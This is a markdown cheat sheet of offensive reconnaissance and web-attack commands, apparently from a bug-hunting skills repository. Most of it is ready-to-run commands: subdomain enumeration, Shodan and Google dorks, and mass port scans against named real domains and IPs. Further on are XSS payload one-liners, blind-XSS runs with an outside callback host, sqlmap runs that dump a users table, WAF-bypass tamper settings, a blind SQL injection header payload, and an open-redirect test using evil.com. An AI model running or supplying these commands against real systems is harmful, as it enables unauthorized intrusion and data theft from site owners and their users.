# RECON FOR SEC — Additional Reconnaissance Techniques
# Synced from yaklang/hack-skills/recon-for-sec

---

## SUBDOMAIN ENUMERATION — PASSIVE

### subfinder
```bash
subfinder -dL domains.txt -o subfinder.txt
subfinder -d inholland.nl -o subfinder.txt
```

### amass
```bash
go install -v github.com/OWASP/Amass/v3/...@master
amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt
```

### assetfinder
```bash
echo test.com | assetfinder --subs-only >> asset.txt;
```

### github-subdomains
```bash
python github-subdomains.py -t your-github-token -d test.com | grep -v '@' | sort -u | grep "\.test.com" >> github-subs.txt
```

### crt.sh
```bash
curl -s https://crt.sh/?q=%25.test.com | grep test.com | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
```

### crtfinder
```bash
python3 crtfinder.py -u alloyhome.com
```

### sublist3r
```bash
sublist3r -d safesavings.com -o sublist3r.txt
```

### Google Dorks
```
site:*.ibm.com -site:www.ibm.com
```

---

## MERGING SUBDOMAINS
```bash
cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
cat all-subs.txt | httpx -o live-subs.txt
cat live-subs.txt | dirsearch --stdin
```

---

## SUBDOMAIN ENUMERATION — ACTIVE

### Bruteforcing
```bash
ffuf -u "https://FUZZ.kaggle.com" -w best-dns-wordlist.txt -mc 200,403,404,302,301
gobuster dns -d test.com -t 50 -w 2m-subdomains.txt -q -o g.txt
puredns bruteforce Subdomain.txt test.com resolvers.txt
```

### Wordlists
```bash
# https://wordlists.assetnote.io/
```

### Script
```bash
#!/bash/bin
for url in $(cat domains.txt); do
subfinder -d $url -all >> subfinder.txt;
amass enum -passive -norecursive -noalts -d $url >> amass.txt;
echo $url | assetfinder --subs-only >> asset.txt;
python github-subdomains.py -t your-github-token -d $url | grep -v '@' | sort -u | grep "\.$url" >> github-subs.txt
 curl -s https://crt.sh/?q=%25.$url | grep $url | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt
done
 cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt
 rm -r subfinder.txt amass.txt asset.txt crt.txt
 cat all-subs.txt | httpx -o live-subs.txt
 #rm -r all-subs.txt
```

---

## SUBDOMAIN TAKEOVER
```bash
nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt
subzy run --targets live-subs.txt
subzy run --target test.google.com
subzy run --target test.google.com,https://test.yahoo.com
```

---

## COLLECTING URLS AND PARAMETERS

### waymore
```bash
waymore -i example.com -mode U -oU result.txt
cat result.txt | sort -u > sorted.txt
cat sorted.txt | httpx -mc 200 -o live-urls.txt
cat live-urls.txt | grep "=" > live-parameters.txt
```

### Script
```bash
#!/bash/bin
for d in $(cat target.txt); do
waybackurls $d >> wayback.txt
echo $d | gau >> gau.txt
paramspider -d $d
python github-endpoints.py -t your-github-token -d $d >> github-urls.txt
done
cat wayback.txt gau.txt results/*.txt github-urls.txt > f.txt
cat f.txt | grep "=" > urls.txt
cat urls.txt | httpx -silent -o p.txt
cat p.txt | uro > params.txt
################################
cat f.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
rm -r wayback.txt gau.txt results/*.txt
rm -r urls.txt
rm -r p.txt
rm -r f.txt
```

---

## JS HUNTING

### Collecting
```bash
katana -u https://www.example.com | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt
echo example.com | gau | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
cat waymore.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a
```

### Scanning
```bash
cat js-files.txt | jscracker | tee jscracker-result.txt
nuclei -l js-files.txt -t /root/nuclei-templates/http/exposures/ | tee nuclei-result.txt
JSS-Scanner: python3 JSScanner.py
Pinkerton: python3 main.py -u https://example.com
```

### Install
```bash
go install github.com/Ractiurd/jscracker@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

---

## VIRTUAL HOST SCANNER
```bash
git clone https://github.com/jobertabma/virtual-host-discovery.git
ruby scan.rb --ip=151.101.194.133 --host=cisco.com
```

---

## SHODAN DORKING
```bash
ssl.cert.subject.CN:"gevme.com*" 200
ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
Set-Cookie:"mongo-express=" "200 OK"
ssl:"invisionapp.com" http.title:"index of / "
ssl:"arubanetworks.com" 200 http.title:"dashboard"
net:192.168.43/24, 192.168.40/24
AEM Login Panel: git clone https://github.com/0ang3el/aem-hacker.git
User:anonymous
Pass:anonymous
```

### Collect IPs
```bash
cat ips.txt | httpx > live-ips.txt
cat live_ips.txt | dirsearch --stdin
```

---

## GOOGLE DORKING
```bash
site:*.gapinc.com inurl:”admin | login” | inurl:.php | .asp
intext:"index of /.git"
site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com | link:www.hackerone.com | link:www.slack.com | link:www.github.com
inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
inurl:/geoserver/ows?service=wfs
```

---

## GITHUB DORKING
```bash
git-Grabber:
python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s
python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo.com" -s
python3 gitGraber.py -k keywordsfile.txt -q "yahoo.com" -s -w mywordlist.txt

GitHound
```

---

## CHECK-LIST — Manual Hunting
1. CSRF
2. IDORS
3. Bussiness Logic Vulnerbilities
4. API bugs
5. SQLi
6. XSS

---

## XSS
```bash
python3 paramspider.py --domain indrive.com
python3 paramspider.py --domain https://www.vendasta.com --exclude woff,css,png,svg,jpg --output t.txt
cat indrive.txt | kxss  (looking for reflected: "<>)

cat output/t.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt

cat params.txt | Gxss -c 100 -p Xss | sort -u | dalfox pipe

echo "pintu.co.id" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe

waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done

dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
dalfox file urls.txt -b https://hahwul.xss.ht

echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
cat urls.txt | Gxss -c 100 -p XssReflected
```

---

## HIDDEN PARAMETERS — Arjun
```bash
arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
```

---

## SQL INJECTION
```bash
sqlmap -m s.txt --level 1 --random-agent --batch --dbs
sqlmap -m s.txt --level 1 --random-agent --batch --tamper="space2comment" --dbs

echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

sqlmap -u https://3.65.104.18/index.php --dbs --forms --crawl=2
sqlmap -u "http://www.example.com/submit.php" --data="search=hello&value=submit"

sqlmap -u "https://3.65.104.18/index.php/index/loginpopupsave" --data "username=2&password=3" -p "username,password" --method POST
sqlmap -r request.txt -p login --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname

sqlmap -u "http://www.example.com/submit.php" --data="search=hello&value=submit"
```

### One-liner
```bash
cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```

### Dump Data
```bash
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
```

### WAF Bypass
```bash
--batch --random-agent --tamper="space2comment" --level=5 --risk=3 --threads=10 --dbs
--level=5 --risk=3 --random-agent -v3 --tamper="between,randomcase,space2comment" --dbs
--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
-v3 --technique U --tamper="space2mysqlblank.py" --dbs
-v3 --technique U --tamper="space2comment" --dbs
```

---

## SSTI
```bash
git clone https://github.com/epinna/tplmap.git
./tplmap.py -u "domain.com/?parameter=SSTI*"
```

---

## Info Disclosure
```bash
httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
```

---

## TESTING XSS + SQLi AT SAME TIME
```bash
cat subdomains.txt | waybackurls | uro | grep "?" | httpx -silent > param.txt
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
cat param.txt | kxss
```

---

## BLIND SQL INJECTION
```bash
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```

---

## BLIND XSS
```bash
site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"
```
Go to xss.report and create account.

---

## CORS MISCONFIGURATION
```bash
https://github.com/chenjj/CORScanner
pip install corscanner
corscanner -i live_subdomains.txt -v -t 100
```
```bash
https://github.com/Tanmay-N/CORS-Scanner
go install github.com/Tanmay-N/CORS-Scanner@latest
cat CORS-domain.txt | CORS-Scanner
```

---

## PORT SCANNING
### Masscan
```bash
masscan -p0-79,81-442,444-65535 -iL live-ips.txt --rate=10000 -oB temp
masscan --readscan temp | awk '{print $NF":"$4}' | cut -d/ -f1 > open-ports.txt
```

### Naabu
```bash
naabu -rate 10000 -l live-hosts.txt -silent
naabu -rate 10000 -host cvo-abrn-stg.sys.comcast.net -silent
```

### Nmap
```bash
nmap -Pn -sV -iL live-hosts.txt -oN scaned-port.txt --script=vuln
nmap -sS -p- 192.168.1.4 (-sS) Avoid Firewell && Connection Log.
nmap -sS -p- -iL hosts.txt
nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt
nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
nmap -sT -p- 192.168.1.4  (Full Scan (TCP))
nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).
nmap -sV 192.168.1.4 (Services Fingerprinting).
nmap 192.168.1.5 -O  (OS Fingerprinting).
nmap 192.168.1.0-255 -sn (Live Hosts with me in network).
nmap -iL hosts.txt -sn
nc -nvz 192.168.1.4 1-65535 (Port Scanning Using nc).
nc -vn 34.66.209.2 22  (Services Fingerprinting).
netdiscover  (Devices On Network) (Layer2).
netdiscover -r 192.168.2.0/24 (Range).
netdiscover -p  (Passive).
netdiscover -l hosts.txt
```

---

## NUCLEI
```bash
nuclei -u https://example.com
nuclei -list urls.txt -t /fuzzing-templates
nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
nuclei -u https://example.com -w workflows/
```

---

## OPEN REDIRECT
```bash
waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

---

## RESOURCES AND TOOLS
```bash
https://github.com/orwagodfather/x
https://github.com/SAPT01/HBSQLI
python3 hbsqli.py -l y.txt -p payloads.txt -H headers.txt -v
python3 hbsqli.py -u "https://target.com" -p payloads.txt -H headers.txt -v
https://github.com/thecybertix/One-Liner-Collections
https://github.com/projectdiscovery/fuzzing-templates
https://github.com/0xKayala/NucleiFuzzer
https://wpscan.com/vulnerability/825eccf9-f351-4a5b-b238-9969141b94fa
```